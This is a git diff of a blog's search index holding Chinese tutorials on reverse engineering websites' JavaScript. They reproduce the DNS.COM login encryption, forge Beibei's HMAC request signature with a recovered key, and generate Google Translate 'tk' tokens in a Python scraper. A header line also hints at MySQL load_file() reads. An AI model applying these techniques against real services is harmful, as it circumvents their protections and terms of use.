-<p>秘钥：加密解密使用的不同秘钥、有两个密钥、需要使用密钥生成算法生成两个秘钥、数据的机密性只能单向加密、如果想解决这个问题、双向都需要各自有一对秘钥、加密效率低、加密强度高</p>
-]]></content>
-      <categories>
-        <category>JS逆向</category>
-      </categories>
-      <tags>
-        <tag>JS逆向系列</tag>
       </tags>
   </entry>
   <entry>
@@ -443,6 +361,177 @@ show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
       </categories>
       <tags>
         <tag>技巧</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JS逆向系列一</title>
+    <url>/2020/06/17/JS%E9%80%86%E5%90%91%E4%B8%80/</url>
+    <content><![CDATA[<h3 id="谷歌学术镜像">谷歌学术镜像</h3>
+<p>目标网址：<a href="https://ac.scmor.com/">https://ac.scmor.com/</a></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531174729.png" alt=""></p>
+<p>目的是爬取学术镜像的真实地址，在Elements视图下，观察<code>现在访问</code>a标签，发现启用了onclick事件，调用了<code>visit()</code>函数，函数内的内容，猜测就是加密后的真实URL地址。</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531174922.png" alt=""></p>
+<p>全局搜索<code>visit</code>,在 <a href="https://ac.scmor.com/res/?f=run&amp;v=1590682984">https://ac.scmor.com/res/?f=run&amp;v=1590682984</a> 中，找到了<code>visit</code>函数</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531175244.png" alt=""></p>
+<p>经过观察，猜测<code>strdecode</code>是解密函数，就在上几行的位置，有个可疑参数<code>autour[b]</code>，猜测是URL地址，在Console中测试一下</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531180634.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531180730.png" alt=""></p>
+<p>经测试，<code>autour</code>是个数组，里面存放了加密后的真实地址，<code>strdecode</code>也的确是解密函数，现在去拉取<code>strdecode</code>函数具体内容<br>
+全局搜索，找到了<code>strdecode</code>，经过初步观察，是Base64加密，然后缺啥补啥，将加密函数完整的提取出来</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531181249.png" alt=""></p>
+<p>到此，加密函数也有了，现在需要收集全部的URL，于是，之前的<code>autour</code>数组，也拉下来，现在只需要遍历一下就好了，刚好有个<code>run</code>函数就是For循环遍历<code>autour</code>数组，也拿下来</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531181940.png" alt=""></p>
+<p>稍微修改下细节，就大功告成，效果图如下：</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531182151.png" alt=""></p>
+<h3 id="DNS-COM"><a href="http://DNS.COM">DNS.COM</a></h3>
+<p>目标网址：<a href="https://www.dns.com/login.html">https://www.dns.com/login.html</a></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601011619.png" alt=""></p>
+<p>随便输入帐号密码进行测试，发现有个XHR请求，里面的<code>password</code>，<code>email</code>两个请求参数都做了加密，猜测这就是刚才输入的帐号密码</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601011947.png" alt=""></p>
+<p>全局搜索 <code>password</code>,通过在后面加上 : 或者 = 可以缩小范围，排除多余项，找到了<code>password:</code>的位置，现在其实已经很明显是AES加密了，但还是测试一下吧</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601012327.png" alt=""></p>
+<p>打断点，重新登陆，果然进入debugger状态了。</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601012821.png" alt=""></p>
+<p>然后在console中测试下<code>aes()</code>函数以及它的参数到底是什么，经验证，发现<code>aes()</code>正是一个加密函数，加密后的内容和一开始看到的相吻合</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601013000.png" alt=""></p>
+<p>现在查看<code>aes</code>函数具体的内容，发现了又有<code>k</code>和<code>iv</code>，并且有个CryptoJS对象</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601095717.png" alt=""></p>
+<p>全局搜索CryptoJS，发现了<code>crypto-js.js</code>文件，明显这是CryptoJS加密库</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601100429.png" alt=""></p>
+<p>并且发现还用了<code>$(selector).action()</code>的jQuery语法，所以还需要载入jQuery库</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601112445.png" alt=""></p>
+<p>从网上下载单独的CryptoJS库文件引入，从 网页中获取jQuery链接，并载入 jQuery，然后将<code>aes</code>函数也拉下来</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601113127.png" alt=""></p>
+<p>效果图如下：</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601113229.png" alt=""></p>
+<h3 id="贝贝网">贝贝网</h3>
+<p>目标网址：<a href="https://m.beibei.com/login/login.html">https://m.beibei.com/login/login.html</a> （需手机端）</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601154549.png" alt=""></p>
+<p>输入帐号密码及验证码进行测试，发现一个XHR请求，类型为POST，提交的表单数据中的用户名密码都为明文，但问题在于请求参数中的<code>_abr_</code>一直在变化，猜测它为加密参数</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601155448.png" alt=""></p>
+<p>全局搜索<code>_abr_</code>无果，只能打请求断点，成功断住</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601160354.png" alt=""></p>
+<p>但是发现断点的位置没有我们要的内容，于是在call Stack中往下找调用栈，call Stack内的方法调用栈的规则是从上到下由最新调用处依次往下排列。在<code>e.ajax</code>中发现了包含有<code>_abr_</code>的内容，但是这里是要发送出去了，没有它的产生过程，于是继续往下找，终于找到了<code>_abr_=</code></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601163002.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601163301.png" alt=""></p>
+<p>记录<code>_abr_</code>的值为：“013e01885f35c08258b6ce21d500874ed5bb3143a05ed4b7b1”<br>
+发现<code>_abr_</code>其实是由<code>m(e.type, e.uri.pathname, e.query, e.form)</code>函数生成，于是为了了解它的生成过程，在函数前打上断点，重新发送登陆请求</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601165214.png" alt=""></p>
+<p>单步跟踪，发现了关键函数<code>MD5</code></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601165852.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601170350.png" alt=""></p>
+<p>继续单步跟踪，又发现了一个关键函数<code>HMAC</code></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171039.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171405.png" alt=""></p>
+<p>网上查找资料了解这个加密算法，发现HMAC算法，需要一个信息摘要算法以及一个密钥，在下方又找到关键函数<code>HmacSHA1</code>，于是推测使用了SHA-1算法</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171755.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601185857.png" alt=""></p>
+<p>经过长时间的单步跟踪，总算来到了一开始的函数返回值部分</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601174129.png" alt=""></p>
+<p>现在，我们开始分析，HMAC算法可以使用Python第三方库实现，先尝试一下。加密内容有了，密钥也有了（加密目标值可以用<code>JSON.stringify()</code>提取）<br>
+加密目标值：“01\nPOST\nb7da15fd7cdc2b8c73958ee82e7424aa\n/mroute.html?method=beibei.user.token.get\n1591002077”<br>
+密钥：“ytU7vwqIx2UXQNsi”</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601190441.png" alt=""></p>
+<p>Python测试效果如下</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191001.png" alt=""></p>
+<p>但是发现，与<code>_abr</code>的值相较，少了一些内容，回过头观察，发现<code>_abr</code>的值由<code>a+m+h</code>组成，<code>a</code>经测试是固定值<code>01</code>，<code>m</code>就是经过HMAC加密后的值，<code>h</code>会变动且暂时还不清楚</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191307.png" alt=""></p>
+<p>对<code>h</code>进行分析，发现是由<code>s</code>的值使用<code>toString(16)</code>函数变化而来，而<code>s</code>则是时间戳(<code>new Date</code>)变化而来</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191707.png" alt=""></p>
+<p>提取出<code>h</code>的算法，测试了一下，成功</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601194144.png" alt=""></p>
+<p>接下来，只剩下需要加密的值，它如何产生的，观察发现由<code>a + &quot;\n&quot; + e + &quot;\n&quot; + f + &quot;\n&quot; + p + &quot;\n&quot; + s</code>组成，<code>a</code>、<code>s</code>都清楚了，<code>e</code>发现是<code>POST</code>，<code>p</code>是路径<code>/mroute.html?method=beibei.h5.login</code>，这两个也是固定值，只剩下<code>f</code>是MD5加密后的值，逆向<code>f</code>的产生过程，发现是由&quot;用户名+路径+登陆id&quot;产生而来，如：<code>username=12341234123&amp;scene=h5_login&amp;rams_device_id=2654748010</code><br>
+所以现在只需要将这个值MD5加密后传入即可，同样也能用Python实现</p>
+<p>最终完成的效果<br>
+<img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601195839.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>JS逆向</category>
+      </categories>
+      <tags>
+        <tag>JS逆向系列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JS逆向系列之谷歌翻译</title>
+    <url>/2020/06/17/JS%E9%80%86%E5%90%91%E4%B9%8B%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91/</url>
+    <content><![CDATA[<h3 id="一、逆向谷歌翻译">一、逆向谷歌翻译</h3>
+<h4 id="分析过程">分析过程</h4>
+<ul>
+<li>首次分析</li>
+</ul>
+<p>首先找到谷歌翻译的Ajax请求接口</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529141646.png" alt=""></p>
+<p>以get方式发送的Ajax请求，多次尝试，发现请求参数中，<code>tk</code>和<code>q</code>，是不断变化的，其中<code>q</code>是待翻译的内容，<code>tk</code>是根据<code>q</code>进行js加密算法生成的，所以我们要分析<code>tk</code>的产生。</p>
+<ul>
+<li>通过断点逆向<code>tk</code>的加密算法</li>
+</ul>
+<p>加密算法应该在translate_m_zh-CN.js文件里</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529142909.png" alt=""></p>
+<p>打个断点，请求翻译接口的URL时停止，发现在send(a)中停止了，根据Call Stack的调用关系，一步步分析，最上面的就是send函数</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143414.png" alt=""></p>
+<p>依次往下点击每一个调用的函数，当到了QE函数的时候，发现了<code>tk</code>参数来自b，b又明显来自c</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143742.png" alt=""></p>
+<p>于是我们顺藤摸瓜，发现c是由PE(d)产生的，PE又是来自pu(a)函数，我们跳转到pu函数的位置，似乎已经有了答案</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144207.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144416.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144520.png" alt=""></p>
+<ul>
+<li>分析生成<code>tk</code>的JS代码</li>
+</ul>
+<p>如下是我们刚获取的JS代码</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  , nu = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">&quot;a&quot;</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">&quot;+&quot;</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">&quot;+&quot;</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line">  , ou = <span class="literal">null</span></span><br><span class="line">  , pu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> !== ou)</span><br><span class="line">        <span class="keyword">var</span> b = ou;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        b = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">84</span>));</span><br><span class="line">        <span class="keyword">var</span> c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">75</span>));</span><br><span class="line">        b = [b(), b()];</span><br><span class="line">        b[<span class="number">1</span>] = c();</span><br><span class="line">        b = (ou = <span class="built_in">window</span>[b.join(c())] || <span class="string">&quot;&quot;</span>) || <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> d = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>));</span><br><span class="line">    c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">107</span>));</span><br><span class="line">    d = [d(), d()];</span><br><span class="line">    d[<span class="number">1</span>] = c();</span><br><span class="line">    c = <span class="string">&quot;&amp;&quot;</span> + d.join(<span class="string">&quot;&quot;</span>) + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">    d = b.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    b = <span class="built_in">Number</span>(d[<span class="number">0</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h : (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> : (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>),</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) : e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>),</span><br><span class="line">        e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">&quot;+-a^+6&quot;</span>);</span><br><span class="line">    a = nu(a, <span class="string">&quot;+-3^+b+-f&quot;</span>);</span><br><span class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> c + (a.toString() + <span class="string">&quot;.&quot;</span> + (a ^ b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>发现做了很多不必要的操作、甚至多此一举，目的是用于混淆<br>
+如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var mu &#x3D; function(a) &#123;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        return a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还用了<code>.fromCharCode()</code>函数，把数字转换为字母，明显多此一举的操作。但是，通过分析，发现<code>tk</code>生成需要另一样东西，就是<code>tkk</code>这个参数，来源于网页源代码上，寻找一番，还是发现了，多次尝试，发现这个值是固定的</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529145556.png" alt=""></p>
+<h4 id="具体实现">具体实现</h4>
+<p>说明：js文件做了精炼，把不必要的值去掉了，实行的效果是英译中，不同语言的翻译修改请求的参数即可</p>
+<ul>
+<li>Python脚本</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tk</span>(<span class="params">q</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;google_tk.js&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        js = f.read()</span><br><span class="line">    j = execjs.<span class="built_in">compile</span>(js)</span><br><span class="line">    tk = j.call(<span class="string">&#x27;pu&#x27;</span>, q)</span><br><span class="line">    <span class="keyword">return</span> tk</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">translate_google</span>():</span></span><br><span class="line">    q = <span class="built_in">input</span>(<span class="string">&quot;请输入你要翻译的内容：&quot;</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://translate.google.cn/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://translate.google.cn/translate_a/single?client=webapp&amp;sl=en&amp;tl=zh-CN&amp;hl=zh-CN&amp;dt=at&amp;dt=bd&amp;dt=ex&amp;dt=ld&amp;dt=md&amp;dt=qca&amp;dt=rw&amp;dt=rm&amp;dt=sos&amp;dt=ss&amp;dt=t&amp;otf=2&amp;ssel=0&amp;tsel=0&amp;kc=3&amp;tk=&quot;</span> + get_tk(</span><br><span class="line">        q) + <span class="string">&quot;&amp;q=&quot;</span> + q</span><br><span class="line">    res = requests.get(url, headers=headers)</span><br><span class="line">    data = res.content.decode()</span><br><span class="line">    json_data = json.loads(data)</span><br><span class="line">    print(json_data[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    translate_google()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>tk.js</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//tkk = &#x27;441865.2154418832&#x27;;</span></span><br><span class="line"><span class="keyword">var</span> nu = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">&quot;a&quot;</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">&quot;+&quot;</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">&quot;+&quot;</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">pu = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">    tkk=<span class="string">&#x27;441865.2154418832&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> d = tkk.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> b = <span class="built_in">Number</span>(d[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h :</span><br><span class="line">            (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> :</span><br><span class="line">                    (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>), e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>, e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) :</span><br><span class="line">                        e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>, e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>), e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">&quot;+-a^+6&quot;</span>);</span><br><span class="line">    a = nu(a, <span class="string">&quot;+-3^+b+-f&quot;</span>);</span><br><span class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> (a.toString() + <span class="string">&quot;.&quot;</span> + (a ^ b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h4 id="运行效果">运行效果</h4>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529150718.png" alt=""></p>
+<h3 id="二、总结常见算法的加密原理">二、总结常见算法的加密原理</h3>
+<ul>
+<li>散列(hash)函数算法：MD5、SHA</li>
+<li>对称加密算法：DES、3DES、AES</li>
+<li>非对称性加密算法：RSA、DSA、ECC</li>
+</ul>
+<h4 id="散列-hash-函数算法">散列(hash)函数算法</h4>
+<ul>
+<li>简介</li>
+</ul>
+<p>Hash也称散列、哈希，对应的英文都是Hash。基本原理就是把任意长度的输入，通过Hash算法变成固定长度的输出。这个映射的规则就是对应的Hash算法，而原始数据映射后的二进制串就是哈希值。活动开发中经常使用的MD5和SHA都是历史悠久的Hash算法。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo md5(&quot;这是一个测试文案&quot;);&#x2F;&#x2F; 输出结果：2124968af757ed51e71e6abeac04f98d</span><br></pre></td></tr></table></figure>
+<ul>
+<li>特点</li>
+</ul>
+<p>一、不可逆，与原视数据没有对应关系<br>
+二、输入数据的微小变化会得到完全不同的hash值，相同的数据会得到相同的值<br>
+三、hash算法冲突概率比较小，但是根据抽屉原理，一定会存在不同的输入被映射成相同输出的情况</p>
+<h4 id="对称加密算法">对称加密算法</h4>
+<ul>
+<li>简介</li>
+</ul>
+<p>秘钥：加密解密使用同一个密钥、数据的机密性双向保证、加密效率高、适合加密于大数据大文件、加密强度不高(相对于非对称加密)</p>
+<h4 id="非对称性加密算法">非对称性加密算法</h4>
+<ul>
+<li>简介</li>
+</ul>
+<p>秘钥：加密解密使用的不同秘钥、有两个密钥、需要使用密钥生成算法生成两个秘钥、数据的机密性只能单向加密、如果想解决这个问题、双向都需要各自有一对秘钥、加密效率低、加密强度高</p>
+]]></content>
+      <categories>
+        <category>JS逆向</category>
+      </categories>
+      <tags>
+        <tag>JS逆向系列</tag>
       </tags>
   </entry>
   <entry>
@@ -707,95 +796,6 @@ show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
       </tags>
   </entry>
   <entry>
-    <title>JS逆向系列一</title>
-    <url>/2020/06/17/JS%E9%80%86%E5%90%91%E4%B8%80/</url>
-    <content><![CDATA[<h3 id="谷歌学术镜像">谷歌学术镜像</h3>
-<p>目标网址：<a href="https://ac.scmor.com/">https://ac.scmor.com/</a></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531174729.png" alt=""></p>
-<p>目的是爬取学术镜像的真实地址，在Elements视图下，观察<code>现在访问</code>a标签，发现启用了onclick事件，调用了<code>visit()</code>函数，函数内的内容，猜测就是加密后的真实URL地址。</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531174922.png" alt=""></p>
-<p>全局搜索<code>visit</code>,在 <a href="https://ac.scmor.com/res/?f=run&amp;v=1590682984">https://ac.scmor.com/res/?f=run&amp;v=1590682984</a> 中，找到了<code>visit</code>函数</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531175244.png" alt=""></p>
-<p>经过观察，猜测<code>strdecode</code>是解密函数，就在上几行的位置，有个可疑参数<code>autour[b]</code>，猜测是URL地址，在Console中测试一下</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531180634.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531180730.png" alt=""></p>
-<p>经测试，<code>autour</code>是个数组，里面存放了加密后的真实地址，<code>strdecode</code>也的确是解密函数，现在去拉取<code>strdecode</code>函数具体内容<br>
-全局搜索，找到了<code>strdecode</code>，经过初步观察，是Base64加密，然后缺啥补啥，将加密函数完整的提取出来</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531181249.png" alt=""></p>
-<p>到此，加密函数也有了，现在需要收集全部的URL，于是，之前的<code>autour</code>数组，也拉下来，现在只需要遍历一下就好了，刚好有个<code>run</code>函数就是For循环遍历<code>autour</code>数组，也拿下来</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531181940.png" alt=""></p>
-<p>稍微修改下细节，就大功告成，效果图如下：</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531182151.png" alt=""></p>
-<h3 id="DNS-COM"><a href="http://DNS.COM">DNS.COM</a></h3>
-<p>目标网址：<a href="https://www.dns.com/login.html">https://www.dns.com/login.html</a></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601011619.png" alt=""></p>
-<p>随便输入帐号密码进行测试，发现有个XHR请求，里面的<code>password</code>，<code>email</code>两个请求参数都做了加密，猜测这就是刚才输入的帐号密码</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601011947.png" alt=""></p>
-<p>全局搜索 <code>password</code>,通过在后面加上 : 或者 = 可以缩小范围，排除多余项，找到了<code>password:</code>的位置，现在其实已经很明显是AES加密了，但还是测试一下吧</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601012327.png" alt=""></p>
-<p>打断点，重新登陆，果然进入debugger状态了。</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601012821.png" alt=""></p>
-<p>然后在console中测试下<code>aes()</code>函数以及它的参数到底是什么，经验证，发现<code>aes()</code>正是一个加密函数，加密后的内容和一开始看到的相吻合</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601013000.png" alt=""></p>
-<p>现在查看<code>aes</code>函数具体的内容，发现了又有<code>k</code>和<code>iv</code>，并且有个CryptoJS对象</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601095717.png" alt=""></p>
-<p>全局搜索CryptoJS，发现了<code>crypto-js.js</code>文件，明显这是CryptoJS加密库</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601100429.png" alt=""></p>
-<p>并且发现还用了<code>$(selector).action()</code>的jQuery语法，所以还需要载入jQuery库</p>
